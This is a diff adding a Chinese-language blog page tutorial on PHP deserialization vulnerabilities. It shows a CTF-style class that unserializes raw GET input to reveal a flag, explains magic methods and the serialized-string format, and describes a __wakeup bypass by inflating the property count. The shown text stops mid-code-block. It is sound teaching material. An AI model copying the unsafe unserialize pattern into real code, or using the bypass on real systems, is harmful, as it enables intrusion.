@@ -1,0 +1,1588 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/colourful.png">
+  <link rel="icon" href="/img/colourful.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Colourful">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="事例源码分析123456789101112131415161718192021222324252627282930313233343536&lt;?php  header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化">
+<meta property="og:url" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Colourful">
+<meta property="og:description" content="事例源码分析123456789101112131415161718192021222324252627282930313233343536&lt;?php  header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202159217.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202210877.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202216429.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202223653.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202231855.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202330204.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202333082.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202336741.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202343687.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202348626.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202358113.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202402148.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202406093.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202424990.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202428356.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202432111.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202437164.png">
+<meta property="article:published_time" content="2026-03-19T12:17:00.000Z">
+<meta property="article:modified_time" content="2026-03-19T12:24:39.489Z">
+<meta property="article:author" content="Colourful">
+<meta property="article:tag" content="php反序列化">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202159217.png">
+<meta name="twitter:creator" content="@Colorful">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>php反序列化 - Colourful</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"colourful228.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2026-01-09T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Colorful的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/M.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Colourful
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-19 20:17" pubdate>
+          2026年3月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          75 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">php反序列化</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2026-03-19T20:24:39+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="事例源码分析"><a href="#事例源码分析" class="headerlink" title="事例源码分析"></a>事例源码分析</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br><br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>      <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p><code>class HaHaHa</code>为类</p>
+<p> <code>public $admin;public $passwd;</code>为属性</p>
+<p>  <code>__construct()</code>、<code>__wakeup()</code>、<code>__destruct()</code>为魔术方法</p>
+<h1 id="什么是PHP反序列化"><a href="#什么是PHP反序列化" class="headerlink" title="什么是PHP反序列化"></a>什么是PHP反序列化</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在 PHP 中</p>
+<p>序列化(serialize)是将对象的状态信息转化为可存储或传输的形式（通常是字符串）的过程</p>
+<p>反序列化(unserialize)则是将序列化后的字符串重新转换回对象的过程。 不仅恢复对象的属性值，还会重新建立对象的内部状态  </p>
+<h2 id="主要函数（处理序列化和反序列化）"><a href="#主要函数（处理序列化和反序列化）" class="headerlink" title="主要函数（处理序列化和反序列化）"></a>主要函数（处理序列化和反序列化）</h2><p>serialize()：将对象转换为字符串</p>
+<p>unserialize()：将字符串转换回对象</p>
+<h2 id="序列化的主要目的"><a href="#序列化的主要目的" class="headerlink" title="序列化的主要目的"></a>序列化的主要目的</h2><p>1）将对象状态保存在文件或数据库中</p>
+<p>2）将对象进行远程输出（如前后端交互发送数据）</p>
+<h2 id="访问控制修饰符对序列化的影响）"><a href="#访问控制修饰符对序列化的影响）" class="headerlink" title="访问控制修饰符对序列化的影响）"></a>访问控制修饰符对序列化的影响）</h2><table>
+<thead>
+<tr>
+<th>访问控制修饰符</th>
+<th>对应属性</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>public</td>
+<td>公有属性</td>
+<td>属性保持原样</td>
+</tr>
+<tr>
+<td>protected</td>
+<td></td>
+<td>属性被序列化为属性名格式（前面有一个空字符）</td>
+</tr>
+<tr>
+<td>private</td>
+<td>私有属性</td>
+<td>属性被序列化为类名属性名格式（前后都有空字符）</td>
+</tr>
+</tbody></table>
+<p>这些空字符在URL中编码中会表示为%00</p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>触发时机</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__construct()</td>
+<td>对象创建时调用</td>
+</tr>
+<tr>
+<td>__destruct()</td>
+<td>对象销毁时调用</td>
+</tr>
+<tr>
+<td>__sleep()</td>
+<td>序列化前调用</td>
+</tr>
+<tr>
+<td>__wakeup()</td>
+<td>反序列化后调用</td>
+</tr>
+<tr>
+<td>__toString()</td>
+<td>对象被当作字符串时调用</td>
+</tr>
+<tr>
+<td>__invoke()</td>
+<td>对象被当作函数时调用</td>
+</tr>
+<tr>
+<td>__call()</td>
+<td>调用一个不存在的方法</td>
+</tr>
+<tr>
+<td>__callStatic()</td>
+<td>静态调用或调用成员常量时使用的方法不存在</td>
+</tr>
+<tr>
+<td>__get()</td>
+<td>调用的成员属性不存在</td>
+</tr>
+<tr>
+<td>__set()</td>
+<td>给不存在的成员属性赋值</td>
+</tr>
+<tr>
+<td>__isset()</td>
+<td>对不可访问或不存在的属性</td>
+</tr>
+<tr>
+<td>__unset()</td>
+<td>对不可访问（私有属性）或不存在的属性使用unset()时会触发</td>
+</tr>
+<tr>
+<td>__clone()</td>
+<td>使用clone关键词拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</td>
+</tr>
+</tbody></table>
+<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="1、漏洞产生的条件"><a href="#1、漏洞产生的条件" class="headerlink" title="1、漏洞产生的条件"></a>1、漏洞产生的条件</h2><p>1）应用程序使用unserialize()函数处理用户输入</p>
+<p>2）输入数据未经过充分验证</p>
+<p>3）存在可利用的魔术方法或对象方法调用链</p>
+<h2 id="2、漏洞利用"><a href="#2、漏洞利用" class="headerlink" title="2、漏洞利用"></a>2、漏洞利用</h2><ol>
+<li>__destruct () 方法利用</li>
+<li>__wakeup()方法绕过</li>
+<li>__toString()方法利用</li>
+</ol>
+<h1 id="魔术方法-1"><a href="#魔术方法-1" class="headerlink" title="魔术方法"></a>魔术方法</h1><h2 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h2><ul>
+<li>构造函数，在创建、实例化一个对象时，会自动执行</li>
+<li>触发时机：实例化对象</li>
+<li>功能：提前清理不必要内容</li>
+<li>参数：非必要</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 创造一个类User</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了构造函数一次&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 实例化User类，此时会触发 __construct() 魔术方法</span><br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>class User定义User类</p>
+<p>public $username定义属性</p>
+<p> 在实例化User类时，会触发__construct()魔术方法</p>
+<p>__construct()魔术方法会将传入的benben参数赋值给类的username属性  </p>
+<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup ()"></a>__wakeup ()</h2><ul>
+<li>反序列化unserialize()会检查是否存在一个__wakeup()方法</li>
+<li>如果存在，则会调用__wakeup()方法预先准备对象所需要的资源</li>
+<li>预先准备对象所需要的资源返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作</li>
+<li>触发时机： 反序列化unserialize之后，结束之前（不确定）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$user_ser</span>));<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>已经构造好的一个序列化数据</p>
+<p>$user_ser &#x3D; ‘O:4:”User”:2:{s:8:”username”;s:1:”a”;s:8:”nickname”;s:1:”b”;}’;</p>
+<h3 id="序列化数据分析"><a href="#序列化数据分析" class="headerlink" title="序列化数据分析"></a>序列化数据分析</h3><table>
+<thead>
+<tr>
+<th>序列化片段</th>
+<th>含义</th>
+<th>解析</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>O</td>
+<td>数据类型标识</td>
+<td>代表对象，表示这段序列化数据对应的是一个PHP对象</td>
+</tr>
+<tr>
+<td>:4:</td>
+<td>类名长度</td>
+<td>:为分隔符，4表示对象所属的类名长度为4个字符</td>
+</tr>
+<tr>
+<td>“User”</td>
+<td>类名</td>
+<td>是对象所属的PHP类名（长度为4，与前面的:4:对应）</td>
+</tr>
+<tr>
+<td>:2:</td>
+<td>对象属性数量</td>
+<td>2表示该对象包含两个可序列化的属性</td>
+</tr>
+<tr>
+<td>{</td>
+<td>对象属性列表开始标记</td>
+<td>{后的内容为对象的属性键值对的集合</td>
+</tr>
+<tr>
+<td>s:8:”username”</td>
+<td>第一个属性的键</td>
+<td>s：属性名类型为”字符串string“:8: ：属性值长度为8个字符”username”：属性名本身（长度8，对应:8: ）</td>
+</tr>
+<tr>
+<td>；</td>
+<td>属性键值分隔符</td>
+<td>分隔属性名和属性值</td>
+</tr>
+<tr>
+<td>s:1:”a”</td>
+<td>第一个属性的值</td>
+<td>s：属性值类型为”字符串string“:1: ：属性值长度为1个字符”a”：属性值本身（长度为1，对于:1: ）</td>
+</tr>
+<tr>
+<td>s:8:”nickname”</td>
+<td>第二个属性的键</td>
+<td>s：属性名类型为”字符串string“:8: ：属性值长度为8个字符”nickname”：属性名本身（长度8，对应:8: ）</td>
+</tr>
+<tr>
+<td>s:1:”b”</td>
+<td>第二个属性的值</td>
+<td>s：属性值类型为”字符串string“:1: ：属性值长度为1个字符”b”：属性值本身（长度为1，对于:1: ）</td>
+</tr>
+</tbody></table>
+<ul>
+<li>定义username为a，nickname为b</li>
+</ul>
+<p>对该序列化数据进行反序列化</p>
+<ul>
+<li>在反序列化之前，会触发__wakeup()魔术方法，使得password的值等于username的值</li>
+</ul>
+<p>绕过方法：让代表属性数量的值加一（只要改成比原属性数量大的数就行）</p>
+<h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h2><ul>
+<li>析(xi)构函数，在对象的所有引用被删除或者当对象被显式<strong>销毁</strong>时执行的魔术方法</li>
+<li>触发时机：对象引用完成或对象被销毁（实例化或反序列化之后）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了析构函数1次&quot;</span>.<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span> ;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 实例化对象结束后，这个对象最终会被销毁，就会触发一次 __destruct() 魔术方法</span><br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-comment">// 